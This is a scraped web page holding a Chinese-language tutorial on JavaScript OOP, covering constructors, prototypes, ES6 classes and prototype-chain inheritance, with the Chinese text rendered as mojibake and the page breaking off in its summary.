itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="éšé€¸177"/> <meta itemprop="url" content="https://juejin.cn/user/1857514486118233"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€Šæ‹†è§£ JS OOP éš¾ç‚¹ï¼šæ„é€ å‡½æ•°ã€åŸå‹ã€Class çš„åº•å±‚å…³è”ã€‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1857514486118233/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    éšé€¸177
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T14:33:46.000Z" title="Tue Feb 03 2026 14:33:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">JSé¢å‘å¯¹è±¡OOPå…¨è§£æï¼šä»åŸå‹åˆ°Classï¼Œå‘Šåˆ«æ¨¡ç³Šè®¤çŸ¥</h2>
<p>å‰è¨€ï¼šå¾ˆå¤šå‰ç«¯æ–°æ‰‹å­¦JSé¢å‘å¯¹è±¡æ—¶ï¼Œéƒ½ä¼šè¢«â€œåŸå‹â€â€œæ„é€ å‡½æ•°â€â€œç»§æ‰¿â€ç»•æ™•â€”â€”JSæ˜æ˜åˆ°å¤„éƒ½æ˜¯å¯¹è±¡ï¼Œå´å’ŒJavaã€Pythonçš„OOPä¸ä¸€æ ·ï¼›ES6çš„classçœ‹ä¼¼ç®€å•ï¼Œåº•å±‚å´è—ç€åŸå‹çš„é€»è¾‘ã€‚æœ¬æ–‡ä»JSçš„è¯­è¨€ç‰¹æ€§å‡ºå‘ï¼Œæ‹†è§£å°è£…ã€åŸå‹ã€ç»§æ‰¿ä¸‰å¤§æ ¸å¿ƒï¼Œç”¨é€šä¿—æ¡ˆä¾‹è®²é€JS OOPçš„æœ¬è´¨ï¼Œé€‚åˆå…¥é—¨åŒå­¦å¤¯å®åŸºç¡€ã€‚</p>
<h3 data-id="heading-1">ä¸€ã€å…ˆå˜æ¸…ï¼šJSæ˜¯â€œåŸºäºå¯¹è±¡â€ï¼Œè€Œéçº¯ç²¹â€œé¢å‘å¯¹è±¡â€</h3>
<p>é¢å‘å¯¹è±¡ï¼ˆOOPï¼‰çš„æ ¸å¿ƒæ˜¯<strong>ç±»ï¼ˆClassï¼‰</strong> ä¸<strong>å®ä¾‹ï¼ˆInstanceï¼‰</strong> ï¼Œé€šè¿‡å°è£…ã€ç»§æ‰¿ã€å¤šæ€å®ç°ä»£ç å¤ç”¨ä¸æ‰©å±•ã€‚ä½†JSæœ‰ä¸ªç‰¹æ®Šä¹‹å¤„ï¼š</p>
<p>å®ƒæ˜¯ä¸€é—¨<strong>åŸºäºå¯¹è±¡ï¼ˆObject-basedï¼‰</strong> çš„è¯­è¨€â€”â€”ä½ æ¥è§¦åˆ°çš„å‡ ä¹æ‰€æœ‰ä¸œè¥¿éƒ½æ˜¯å¯¹è±¡ï¼Œå“ªæ€•æ˜¯å­—ç¬¦ä¸²ã€æ•°å­—ç­‰ç®€å•æ•°æ®ç±»å‹ï¼Œä¹Ÿæœ‰å¯¹åº”çš„åŒ…è£…ç±»ï¼ˆå¦‚Stringã€Numberï¼‰ï¼Œèƒ½è°ƒç”¨å†…ç½®æ–¹æ³•ã€‚</p>
<p>ä½†å®ƒæ—©æœŸæ²¡æœ‰classå…³é”®å­—ï¼Œä¹Ÿæ²¡æœ‰ä¸¥æ ¼æ„ä¹‰ä¸Šçš„â€œç±»æ¨¡æ¿â€ï¼Œå“ªæ€•ES6æ–°å¢äº†classï¼Œå…¶åº•å±‚ä¾ç„¶æ˜¯<strong>åŸå‹å¼é¢å‘å¯¹è±¡</strong>ï¼Œè€Œéä¼ ç»ŸOOPçš„â€œç±»-å®ä¾‹â€è¡€ç¼˜å…³ç³»ã€‚</p>
<p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼šæ²¡æœ‰classå’Œæ˜¾å¼æ„é€ å™¨ï¼ŒJSæ€ä¹ˆå®ç°é¢å‘å¯¹è±¡ï¼Ÿ</p>
<h3 data-id="heading-2">äºŒã€å°è£…ï¼šä»å¯¹è±¡å­—é¢é‡åˆ°æ„é€ å‡½æ•°</h3>
<p>å°è£…çš„æ ¸å¿ƒæ˜¯â€œå°†å±æ€§å’Œæ–¹æ³•æ‰“åŒ…â€ï¼Œéšè—å†…éƒ¨ç»†èŠ‚ã€æš´éœ²å¯æ§æ¥å£ï¼ŒåŒæ—¶è§£å†³å®ä¾‹åˆ›å»ºçš„ä»£ç é‡å¤é—®é¢˜ã€‚JSå®ç°å°è£…ï¼Œç»å†äº†ä»ç®€å•åˆ°è§„èŒƒçš„è¿‡ç¨‹ã€‚</p>
<h4 data-id="heading-3">1. åŸå§‹æ¨¡å¼ï¼šå¯¹è±¡å­—é¢é‡</h4>
<p>æœ€åŸºç¡€çš„åˆ›å»ºå¯¹è±¡æ–¹å¼ï¼Œç›´æ¥ç”¨å­—é¢é‡å®šä¹‰å±æ€§å’Œæ–¹æ³•ï¼Œé€‚åˆå•ä¸ªå¯¹è±¡çš„åœºæ™¯ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å•ä¸ªç”¨æˆ·å¯¹è±¡</span>
<span class="hljs-keyword">const</span> user1 = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">18</span>,
  <span class="hljs-attr">sayHi</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ä½ å¥½ï¼Œæˆ‘æ˜¯<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
  }
};
user1.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// ä½ å¥½ï¼Œæˆ‘æ˜¯å¼ ä¸‰</span>
</code></pre>
<p>ç¼ºç‚¹å¾ˆæ˜æ˜¾ï¼šåˆ›å»ºå¤šä¸ªåŒç±»å¯¹è±¡æ—¶ï¼Œä»£ç å¤§é‡é‡å¤ï¼Œä¸”å®ä¾‹ä¹‹é—´æ²¡æœ‰å…³è”ï¼Œæ— æ³•ä½“ç°â€œåŒå±ä¸€ä¸ªç±»â€çš„å…³ç³»ã€‚</p>
<h4 data-id="heading-4">2. ä¼˜åŒ–ï¼šæ„é€ å‡½æ•°å°è£…å®ä¾‹åŒ–è¿‡ç¨‹</h4>
<p>é€šè¿‡å‡½æ•°å°è£…å®ä¾‹åˆ›å»ºé€»è¾‘ï¼Œç”¨newå…³é”®å­—è°ƒç”¨ï¼ˆæ„é€ å‡½æ•°çº¦å®šé¦–å­—æ¯å¤§å†™ï¼‰ï¼Œå®ç°æ‰¹é‡åˆ›å»ºå®ä¾‹ï¼ŒåŒæ—¶å»ºç«‹å®ä¾‹ä¸æ„é€ å‡½æ•°çš„å…³è”ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ„é€ å‡½æ•°ï¼šå°è£…ç”¨æˆ·ç±»çš„å®ä¾‹åŒ–é€»è¾‘</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">User</span>(<span class="hljs-params">name, age</span>) {
  <span class="hljs-comment">// newè°ƒç”¨æ—¶ï¼Œä¼šè‡ªåŠ¨åˆ›å»ºç©ºå¯¹è±¡ï¼ŒthisæŒ‡å‘è¿™ä¸ªç©ºå¯¹è±¡</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name; <span class="hljs-comment">// ç»™å®ä¾‹æ·»åŠ ç‹¬æœ‰å±æ€§</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">sayHi</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ä½ å¥½ï¼Œæˆ‘æ˜¯<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
  };
}

<span class="hljs-comment">// åˆ›å»ºä¸¤ä¸ªå®ä¾‹</span>
<span class="hljs-keyword">const</span> user1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-number">18</span>);
<span class="hljs-keyword">const</span> user2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">"æå››"</span>, <span class="hljs-number">20</span>);

user1.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// ä½ å¥½ï¼Œæˆ‘æ˜¯å¼ ä¸‰</span>
user2.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// ä½ å¥½ï¼Œæˆ‘æ˜¯æå››</span>
</code></pre>
<p>å…³é”®ç»†èŠ‚ï¼š</p>
<ul>
<li>newè°ƒç”¨æ„é€ å‡½æ•°æ—¶ï¼Œä¼šè‡ªåŠ¨å®Œæˆâ€œåˆ›å»ºç©ºå¯¹è±¡â†’ç»‘å®šthisâ†’æ‰§è¡Œå‡½æ•°ä»£ç â†’è¿”å›å¯¹è±¡â€å››æ­¥ï¼›</li>
<li>æ™®é€šå‡½æ•°è°ƒç”¨ï¼ˆæ— newï¼‰æ—¶ï¼ŒthisæŒ‡å‘windowï¼Œä¼šæ±¡æŸ“å…¨å±€å˜é‡ï¼ŒåŠ¡å¿…æ³¨æ„è°ƒç”¨æ–¹å¼ï¼›</li>
<li>å¯ä»¥é€šè¿‡instanceofåˆ¤æ–­å®ä¾‹å½’å±ï¼šconsole.log(user1 instanceof User); // trueã€‚</li>
</ul>
<p>ä½†è¿™ä¸ªæ–¹æ¡ˆä»æœ‰ä¸è¶³ï¼šæ¯ä¸ªå®ä¾‹çš„sayHiæ–¹æ³•éƒ½ä¼šé‡æ–°åˆ›å»ºä¸€ä»½ï¼Œå ç”¨é¢å¤–å†…å­˜â€”â€”è¿™å°±æ˜¯åŸå‹è¦è§£å†³çš„é—®é¢˜ã€‚</p>
<h3 data-id="heading-5">ä¸‰ã€åŸå‹ï¼ˆPrototypeï¼‰æ¨¡å¼ï¼šè§£å†³å…±äº«ä¸å†…å­˜æµªè´¹</h3>
<p>æ„é€ å‡½æ•°çš„ç‹¬æœ‰å±æ€§/æ–¹æ³•ï¼ˆå¦‚nameã€ageï¼‰éœ€è¦æ¯ä¸ªå®ä¾‹å•ç‹¬æ‹¥æœ‰ï¼Œä½†å…¬ç”¨å±æ€§/æ–¹æ³•ï¼ˆå¦‚sayHiï¼‰æ²¡å¿…è¦é‡å¤åˆ›å»ºã€‚JSé€šè¿‡åŸå‹ï¼Œè®©æ‰€æœ‰å®ä¾‹å…±äº«å…¬ç”¨èµ„æºã€‚</p>
<h4 data-id="heading-6">1. åŸå‹çš„æ ¸å¿ƒé€»è¾‘</h4>
<p>æ¯ä¸ªå‡½æ•°éƒ½æœ‰ä¸€ä¸ª<strong>prototypeå±æ€§</strong>ï¼Œå…¶å€¼æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ˆåŸå‹å¯¹è±¡ï¼‰ï¼›æ„é€ å‡½æ•°çš„æ‰€æœ‰å®ä¾‹ï¼Œéƒ½ä¼šé€šè¿‡ç§æœ‰å±æ€§__proto__ï¼ˆES5æ¨èç”¨Object.getPrototypeOf()ï¼‰æŒ‡å‘è¿™ä¸ªåŸå‹å¯¹è±¡ã€‚</p>
<p>åŸå‹å¯¹è±¡ä¸Šçš„å±æ€§å’Œæ–¹æ³•ï¼Œä¼šè¢«æ‰€æœ‰å®ä¾‹å…±äº«ï¼Œä¸”åªåœ¨å†…å­˜ä¸­å­˜å‚¨ä¸€ä»½ã€‚</p>
<h4 data-id="heading-7">2. ä¼˜åŒ–æ„é€ å‡½æ•°ï¼šå…¬æœ‰æ–¹æ³•æ”¾åŸå‹</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">User</span>(<span class="hljs-params">name, age</span>) {
  <span class="hljs-comment">// å®ä¾‹ç‹¬æœ‰å±æ€§</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
}

<span class="hljs-comment">// å…¬æœ‰æ–¹æ³•/å±æ€§æ”¾åŸå‹ä¸Šï¼Œæ‰€æœ‰å®ä¾‹å…±äº«</span>
<span class="hljs-title class_">User</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHi</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ä½ å¥½ï¼Œæˆ‘æ˜¯<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
};
<span class="hljs-title class_">User</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">gender</span> = <span class="hljs-string">"æœªçŸ¥"</span>; <span class="hljs-comment">// å…±äº«å±æ€§</span>

<span class="hljs-keyword">const</span> user1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-number">18</span>);
<span class="hljs-keyword">const</span> user2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">"æå››"</span>, <span class="hljs-number">20</span>);

<span class="hljs-comment">// å…±äº«åŸå‹ä¸Šçš„æ–¹æ³•å’Œå±æ€§</span>
user1.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// ä½ å¥½ï¼Œæˆ‘æ˜¯å¼ ä¸‰</span>
user2.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// ä½ å¥½ï¼Œæˆ‘æ˜¯æå››</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user1.<span class="hljs-property">gender</span>, user2.<span class="hljs-property">gender</span>); <span class="hljs-comment">// æœªçŸ¥ æœªçŸ¥</span>
</code></pre>
<h4 data-id="heading-8">3. åŸå‹ç›¸å…³å…³é”®æ–¹æ³•</h4>
<ul>
<li>isPrototypeOf()ï¼šåˆ¤æ–­åŸå‹å¯¹è±¡æ˜¯å¦å±äºæŸä¸ªå®ä¾‹ â†’ User.prototype.isPrototypeOf(user1); // trueï¼›</li>
<li>hasOwnProperty()ï¼šåˆ¤æ–­å±æ€§æ˜¯å®ä¾‹ç‹¬æœ‰è¿˜æ˜¯åŸå‹å…±äº« â†’ user1.hasOwnProperty("name"); // trueï¼ˆç‹¬æœ‰ï¼‰ï¼Œuser1.hasOwnProperty("gender"); // falseï¼ˆåŸå‹ï¼‰ï¼›</li>
<li>inè¿ç®—ç¬¦ï¼šåˆ¤æ–­å±æ€§æ˜¯å¦å­˜åœ¨ï¼ˆå®ä¾‹æˆ–åŸå‹ä¸­ï¼‰ â†’ "sayHi" in user1; // trueã€‚</li>
</ul>
<p>æ³¨æ„ï¼šå¦‚æœå®ä¾‹ä¸Šå®šä¹‰äº†ä¸åŸå‹åŒåçš„å±æ€§ï¼Œä¼šä¼˜å…ˆä½¿ç”¨å®ä¾‹çš„å±æ€§ï¼ˆåŸå‹æŸ¥æ‰¾çš„å°±è¿‘åŸåˆ™ï¼‰ã€‚</p>
<h3 data-id="heading-9">å››ã€ES6 Classï¼šåŸå‹çš„è¯­æ³•ç³–</h3>
<p>ES6æ–°å¢classå…³é”®å­—ï¼Œè®©JSçš„OOPå†™æ³•æ›´è´´è¿‘ä¼ ç»Ÿè¯­è¨€ï¼Œä½†<strong>åº•å±‚ä¾ç„¶æ˜¯åŸå‹æœºåˆ¶</strong>ï¼Œclassåªæ˜¯ç®€åŒ–äº†è¯­æ³•ï¼Œæ²¡æœ‰æ”¹å˜æœ¬è´¨ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ES6 Classå†™æ³•</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-comment">// æ„é€ å™¨ï¼šå¯¹åº”ES5çš„æ„é€ å‡½æ•°</span>
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, age</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
  }

  <span class="hljs-comment">// åŸå‹ä¸Šçš„æ–¹æ³•ï¼ˆæ— éœ€å†™prototypeï¼‰</span>
  <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ä½ å¥½ï¼Œæˆ‘æ˜¯<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
  }
}

<span class="hljs-keyword">const</span> user1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-number">18</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user1.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">User</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// trueï¼ˆåº•å±‚è¿˜æ˜¯åŸå‹ï¼‰</span>
</code></pre>
<p>å¯¹æ¯”ES5çš„åŸå‹å†™æ³•ï¼Œclassçš„ä¼˜åŠ¿æ˜¯è¯­æ³•æ›´ç®€æ´ã€è¯­ä¹‰æ›´æ¸…æ™°ï¼Œé¿å…äº†æ‰‹åŠ¨æ“ä½œprototypeçš„ç¹çï¼Œä½†æ ¸å¿ƒé€»è¾‘å®Œå…¨ä¸€è‡´ã€‚</p>
<h3 data-id="heading-10">äº”ã€ç»§æ‰¿ï¼šJSåŸå‹é“¾ä¸æ„é€ å‡½æ•°ç»‘å®š</h3>
<p>ç»§æ‰¿æ˜¯OOPçš„æ ¸å¿ƒç‰¹æ€§ä¹‹ä¸€ï¼Œè®©å­ç±»èƒ½å¤ç”¨çˆ¶ç±»çš„å±æ€§å’Œæ–¹æ³•ï¼ŒåŒæ—¶æ‰©å±•è‡ªèº«åŠŸèƒ½ã€‚JSå®ç°ç»§æ‰¿ï¼Œæ ¸å¿ƒæ˜¯åŸå‹é“¾å’Œæ„é€ å‡½æ•°ç»‘å®šã€‚</p>
<h4 data-id="heading-11">1. åŸºç¡€æ–¹æ¡ˆï¼šæ„é€ å‡½æ•°ç»‘å®šï¼ˆapply/callï¼‰</h4>
<p>é€šè¿‡applyæˆ–callï¼Œå°†çˆ¶ç±»æ„é€ å‡½æ•°çš„thisç»‘å®šåˆ°å­ç±»å®ä¾‹ï¼Œå®ç°çˆ¶ç±»å±æ€§çš„ç»§æ‰¿ï¼Œä½†æ— æ³•ç»§æ‰¿çˆ¶ç±»åŸå‹ä¸Šçš„æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// çˆ¶ç±»ï¼šåŠ¨ç‰©</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">species</span> = <span class="hljs-string">"åŠ¨ç‰©"</span>;
}
<span class="hljs-comment">// çˆ¶ç±»åŸå‹æ–¹æ³•</span>
<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayAnimal</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"æˆ‘æ˜¯åŠ¨ç‰©"</span>);
};

<span class="hljs-comment">// å­ç±»ï¼šç‹—</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Dog</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-comment">// ç»‘å®šçˆ¶ç±»æ„é€ å‡½æ•°çš„thisï¼Œç»§æ‰¿çˆ¶ç±»å±æ€§</span>
  <span class="hljs-title class_">Animal</span>.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>);
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-keyword">const</span> dog1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">"æ—ºè´¢"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dog1.<span class="hljs-property">species</span>); <span class="hljs-comment">// åŠ¨ç‰©ï¼ˆç»§æ‰¿çˆ¶ç±»å±æ€§ï¼‰</span>
dog1.<span class="hljs-title function_">sayAnimal</span>(); <span class="hljs-comment">// æŠ¥é”™ï¼ˆæ— æ³•ç»§æ‰¿åŸå‹æ–¹æ³•ï¼‰</span>
</code></pre>
<h4 data-id="heading-12">2. ä¼˜åŒ–æ–¹æ¡ˆï¼šåŸå‹é“¾ç»§æ‰¿</h4>
<p>è®©å­ç±»çš„åŸå‹æŒ‡å‘çˆ¶ç±»çš„å®ä¾‹ï¼Œé€šè¿‡åŸå‹é“¾å®ç°â€œå±æ€§+æ–¹æ³•â€çš„å…¨ç»§æ‰¿ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">species</span> = <span class="hljs-string">"åŠ¨ç‰©"</span>;
}
<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayAnimal</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"æˆ‘æ˜¯åŠ¨ç‰©"</span>);
};

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Dog</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-title class_">Animal</span>.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// ç»§æ‰¿çˆ¶ç±»å±æ€§</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-comment">// å­ç±»åŸå‹æŒ‡å‘çˆ¶ç±»å®ä¾‹ï¼Œç»§æ‰¿çˆ¶ç±»åŸå‹æ–¹æ³•</span>
<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Animal</span>();

<span class="hljs-keyword">const</span> dog1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">"æ—ºè´¢"</span>);
dog1.<span class="hljs-title function_">sayAnimal</span>(); <span class="hljs-comment">// æˆ‘æ˜¯åŠ¨ç‰©ï¼ˆæˆåŠŸç»§æ‰¿åŸå‹æ–¹æ³•ï¼‰</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dog1.<span class="hljs-property">species</span>); <span class="hljs-comment">// åŠ¨ç‰©</span>
</code></pre>
<p>æ ¸å¿ƒé€»è¾‘ï¼šå­ç±»å®ä¾‹çš„__proto__æŒ‡å‘å­ç±»åŸå‹ï¼ˆçˆ¶ç±»å®ä¾‹ï¼‰ï¼Œçˆ¶ç±»å®ä¾‹çš„__proto__æŒ‡å‘çˆ¶ç±»åŸå‹ï¼Œå±‚å±‚å‘ä¸Šå½¢æˆåŸå‹é“¾ï¼Œç›´åˆ°Object.prototypeï¼ˆåŸå‹é“¾ç»ˆç‚¹ä¸ºnullï¼‰ã€‚</p>
<h3 data-id="heading-13">å…­ã€æ€»ç»“ï¼šJS OOPçš„æœ¬è´¨</h3>
<ol>
<li>JSæ˜¯åŸºäºå¯¹è±¡çš„è¯­è¨€ï¼ŒOOPåº•å±‚ä¾èµ–åŸå‹æœºåˆ¶ï¼Œè€Œéä¼ ç»Ÿç±»ç»§æ‰¿ï¼›</li>
